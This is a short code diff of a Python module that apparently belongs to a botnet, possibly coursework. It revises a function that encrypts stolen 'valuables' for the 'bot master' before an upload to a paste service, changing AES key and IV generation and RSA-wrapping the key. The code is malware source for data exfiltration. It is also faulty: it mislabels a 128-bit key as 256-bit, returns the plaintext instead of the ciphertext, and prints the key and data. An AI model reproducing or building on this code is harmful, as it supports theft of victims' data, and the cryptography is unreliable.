@@ -4,7 +4,7 @@ from Crypto.Signature import PKCS1_v1_5
 from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
-from Crypto.Random import random
+from Crypto import Random
 
 
 # Instead of storing files on disk,
@@ -22,21 +22,22 @@ def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
 
     # Generate key and IV for AES encryption with 256bits key size
-    aes_encryption_key = random.getrandbits(128) # export key and name aes encryption
-    iv = random.getrandbits(AES.block_size)
+    aes_encryption_key = Random.get_random_bytes(16)  # Generate 256bits key
+    iv = Random.get_random_bytes(AES.block_size)
     cipher = AES.new(aes_encryption_key, AES.MODE_CFB, iv)
     encrypted_data = cipher.encrypt(data)
+    print(data)  # Test print. TO BE REMOVE
     print(aes_encryption_key)  # Test print. TO BE REMOVE
     print(encrypted_data)  # Test print. TO BE REMOVE
 
-    # Obtain public key from text file for encrypting aes_msg
+    # Obtain public key from text file for encrypting aes encryption key
     pub_key = open("mypublickey.txt", "r").read()
     rsa_encryption_key = RSA.importKey(pub_key)
-    encrypt_msg = rsa_encryption_key.encrypt(aes_encryption_key) ## Encrpyt aes encryption key
-    print(encrypt_msg)  # encrpyted key
+    encrypt_key = rsa_encryption_key.encrypt(aes_encryption_key, 16)  # Encrypting aes key
+    print(encrypt_key)
     return data
 
-# encrypt_for_master(b"Attack at dawn") # Test print. TO BE REMOVE
+encrypt_for_master("Attack at dawn") # Test print. TO BE REMOVE
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
